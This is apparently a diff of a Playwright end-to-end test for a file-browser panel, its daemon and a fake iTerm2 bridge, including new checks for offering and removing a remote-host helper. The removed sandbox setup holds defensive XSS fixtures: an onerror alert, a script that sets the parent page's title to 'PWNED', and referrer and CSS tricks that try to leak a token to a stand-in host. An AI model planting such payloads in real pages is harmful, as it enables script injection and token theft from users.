@@ -11,88 +11,10 @@ import { spawn } from "node:child_process";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
+import { base, bringBack, check, cleanup, cmds, FBD, internal, PORT, push, restartFbd, results, resume, SB, silence, stopFbd, TOKEN, within } from "./e2e_harness.mjs";
 
 // playwright-core is a devDependency; PLAYWRIGHT_CORE may point at another copy
 const { chromium } = await import(process.env.PLAYWRIGHT_CORE ?? "playwright-core");
-
-const PORT = 47832, SECRET = "e2e-bridge-secret-0123456789";
-const HERE = path.dirname(new URL(import.meta.url).pathname);
-const FBD = process.env.FB_BIN ?? path.resolve(HERE, "../../fbd/target/debug/fbd");
-const SB = fs.realpathSync(fs.mkdtempSync("/tmp/fb-e2e-")); // /tmp is a writable root; $TMPDIR is not
-const APP = fs.mkdtempSync(path.join(os.tmpdir(), "fb-e2e-app-"));   // private token + workspaces
-
-// ── sandbox ──────────────────────────────────────────────────────────────────
-fs.mkdirSync(`${SB}/src`); fs.mkdirSync(`${SB}/docs`);
-fs.writeFileSync(`${SB}/README.md`, "# Sandbox\n\nSee [guide](docs/guide.md) and [web](https://example.com).\n\n![logo](docs/logo.png)\n\n<img src=x onerror=alert(1)>\n");
-fs.writeFileSync(`${SB}/docs/guide.md`, "# Guide\n\nBack to [readme](../README.md#sandbox) or [the page](page.html#sec2).\n");
-fs.writeFileSync(`${SB}/docs/page.html`, '<!doctype html><title>Page</title><h1>HTML page</h1><p><a href="../README.md#sandbox">to readme</a> <a href="guide.md">to guide</a></p><img src="logo.png"><img src="http://leak.example.invalid/x.png"><meta name="referrer" content="unsafe-url"><style>img[src*="t="]{background:url(http://leak.example.invalid/css)}</style><script>parent.document.title="PWNED"</script><div style="height:3000px"></div><p id="sec2">Section two</p>');
-fs.writeFileSync(`${SB}/src/main.rs`, 'fn main() {\n    println!("hi");\n}\n');
-fs.writeFileSync(`${SB}/app.py`, "print(1)\n");
-for (const f of "abcde") fs.writeFileSync(`${SB}/${f}.log`, f);
-for (const d of ["src/a/b", "node_modules/x", ".git/objects"]) fs.mkdirSync(`${SB}/${d}`, { recursive: true });
-// a 1×1 PNG
-fs.writeFileSync(`${SB}/docs/logo.png`, Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64"));
-
-// ── backend with a fake bridge ───────────────────────────────────────────────
-const base = `http://127.0.0.1:${PORT}`;
-/** Start the private fbd (again); `env` plays another build (FB_BUILD_ID) for AC-34. */
-// fbd plays the build the UI bundle was made for, or every panel would reload itself (AC-34)
-const UI_BUILD = fs.readFileSync(path.resolve(HERE, "../.build-id"), "utf8").trim();
-async function startFbd(env = {}) {
-  const p = spawn(FBD, [], { env: { ...process.env, FB_PORT: String(PORT), FB_BRIDGE_SECRET: SECRET, FB_APP_DIR: APP, FB_LOG: "warn", FB_BUILD_ID: UI_BUILD, ...env }, stdio: ["ignore", "ignore", "inherit"] });
-  for (let i = 0; i < 50; i++) { try { await fetch(base + "/"); break; } catch { await new Promise((r) => setTimeout(r, 100)); } }
-  return p;
-}
-let fbd = await startFbd();
-const stopFbd = () => new Promise((r) => { fbd.once("exit", r); fbd.kill(); });
-const TOKEN = fs.readFileSync(path.join(APP, "token"), "utf8").trim();
-let focus = null;
-/** A call only the bridge may make (the fake bridge's secret). */
-const internal = (p, body) => fetch(base + p, { method: "POST", headers: { "Content-Type": "application/json", "X-FB-Bridge": SECRET }, body: JSON.stringify(body) });
-/** The fake bridge reports pane `key` in `cwd`, in iTerm2 window `window` (`panel`: it shows
- *  its Toolbelt), on remote `host` if given (AC-37). The heartbeat repeats the last one. */
-const push = (key, cwd, window = "w1", panel = true, host = undefined) => (focus = [key, cwd, window, panel, host],
-  internal("/internal/state", { key, session: key, cwd, window, panel, host, mode: host ? "remote" : "bash", title: `e2e ${key}`, note: "fake bridge", stale: false }));
-await push("e2eA", SB);
-// the fake bridge's command stream: record commands, answer "which window is key" (AC-36)
-const cmds = [];
-let commands = new AbortController();
-const listenCommands = () => void fetch(base + "/internal/commands", { headers: { "X-FB-Bridge": SECRET }, signal: commands.signal }).then(async (r) => {
-  const reader = r.body.getReader(); const dec = new TextDecoder();
-  for (;;) {
-    const { value, done } = await reader.read(); if (done) break;
-    for (const line of dec.decode(value).split("\n")) {
-      if (!line.startsWith("data:")) continue;
-      const c = JSON.parse(line.slice(5));
-      cmds.push(c);
-      if (c.action === "which-window") void internal("/internal/bound", { req: c.req, window: focus[2], panel: focus[3] });
-    }
-  }
-}).catch(() => {});
-listenCommands();
-/** fbd is back (`env`: as another build); so is the fake bridge. */
-async function bringBack(env = {}) {
-  fbd = await startFbd(env);
-  commands.abort(); commands = new AbortController(); listenCommands();
-  await push(...focus);
-}
-/** fbd goes away for `gapMs` (a restart); `during` runs meanwhile. */
-async function restartFbd(gapMs, during = () => {}) {
-  await stopFbd();
-  during();
-  await new Promise((r) => setTimeout(r, gapMs));
-  await bringBack();
-}
-// like the real bridge: repeat the state every 3 s, or fbd reports it silent after 10 s (AC-30)
-const heartbeat = setInterval(() => void push(...focus).catch(() => {}), 3000);
-
-// ── checks ───────────────────────────────────────────────────────────────────
-const results = [];
-const check = (name, ok, extra = "") => { results.push(ok); console.log(`${ok ? "PASS" : "FAIL"} ${name}${extra ? " — " + extra : ""}`); };
-const within = async (name, fn, ms = 5000) => {
-  const t0 = Date.now();
-  try { await fn(ms); check(name, true, `${Date.now() - t0} ms`); } catch (e) { check(name, false, e.message.split("\n")[0]); }
-};
 
 const browser = await chromium.launch();
 const page = await browser.newPage({ viewport: { width: 520, height: 900 } });
@@ -450,6 +372,38 @@ try {
   check("AC-37 … and its listings never fall back to local files", hosts.length > 0 && hosts.every((h) => h === "e2ehost") && !(await page.$(row("greet.py"))), hosts.join(","));
   await push("e2eA", SB);
 
+  // AC-38 a remote host is offered once: Enable / Not now; the menu enables later or removes
+  const remoteState = (state) => push("e2eO", null, "w1", true, undefined,
+    { mode: "remote", note: "remote host devbox", stale: true, remote: { key: "devbox", name: "devbox", state } });
+  cmds.length = 0;
+  await remoteState("ask");
+  await within("AC-38 the panel offers to browse the host", (ms) => page.waitForSelector('#offer.on button[data-a="enable"]', { timeout: ms }));
+  check("AC-38 … naming it", (await page.textContent("#offer b")) === "devbox is a remote host.");
+  await page.click('#offer button[data-a="enable"]');
+  await page.waitForTimeout(300);
+  check("AC-38 Enable asks the bridge to set the host up", cmds.some((c) => c.action === "host-enable" && c.host === "devbox" && c.by), JSON.stringify(cmds.at(-1)));
+  await remoteState("enabling");
+  await within("AC-38 … and says it is setting up", (ms) => page.waitForSelector('#offer button[data-a="enable"][disabled]', { timeout: ms }));
+  await remoteState("ask");
+  await page.waitForSelector('#offer button[data-a="dismiss"]:not([disabled])');
+  await page.click('#offer button[data-a="dismiss"]');
+  await page.waitForTimeout(300);
+  check("AC-38 Not now tells the bridge", cmds.some((c) => c.action === "host-dismiss" && c.host === "devbox"));
+  await remoteState("dismissed");
+  await within("AC-38 … and the offer goes", (ms) => page.waitForSelector("#offer.on", { state: "detached", timeout: ms }));
+  await page.click("#tree", { button: "right", position: { x: 40, y: 200 } });
+  await page.waitForSelector(".ctx .mi");
+  check("AC-38 the menu can enable it later", !!(await page.$('.ctx .mi:has-text("Browse Files of devbox")')));
+  await page.keyboard.press("Escape");
+  await remoteState("up");
+  await page.click("#tree", { button: "right", position: { x: 40, y: 200 } });
+  await page.click('.ctx .mi:has-text("Remove Helper from devbox")');
+  await page.waitForSelector(".modal");
+  await page.click(".modal button[data-id=remove]");
+  await page.waitForTimeout(300);
+  check("AC-38 Remove (confirmed) asks the bridge to take the helper off", cmds.some((c) => c.action === "host-remove" && c.host === "devbox"));
+  await push("e2eA", SB);
+
   // AC-28 an outdated link says so and stops retrying
   const op = await browser.newPage();
   let calls = 0;
@@ -461,23 +415,19 @@ try {
   await op.close();
 
   // AC-30 a silent bridge is reported, and its return clears the note
-  clearInterval(heartbeat);
-  commands.abort();
+  silence();
   await within("AC-30 silent bridge: \"Not following iTerm2\"", (ms) => page.waitForSelector('#notice.on:has-text("Not following iTerm2")', { timeout: ms }), 13000);
   const st = await (await fetch(base + "/api/state", { headers: { "X-FB-Token": TOKEN } })).json();
   check("AC-30 /api/state says bridge: false", st.bridge === false, JSON.stringify({ bridge: st.bridge, stale: st.stale }));
   check("AC-30 the tree stays usable", await page.isVisible(row("src")));
-  await push(...focus);
+  await resume();
   await within("AC-30 the note clears when the bridge is back", (ms) => page.waitForSelector("#notice:not(.on)", { state: "attached", timeout: ms }), 1000);
 
   check("no page errors or alerts", errors.length === 0, errors.join("; "));
   await page.screenshot({ path: path.join(os.tmpdir(), "fb-e2e-panel.png") });
 } finally {
-  clearInterval(heartbeat);
   await browser.close();
-  fbd.kill();
-  fs.rmSync(SB, { recursive: true, force: true });
-  fs.rmSync(APP, { recursive: true, force: true });
+  cleanup();
 }
 const failed = results.filter((r) => !r).length;
 console.log(failed ? `FAIL (${failed} of ${results.length})` : `PASS (${results.length} checks)`);
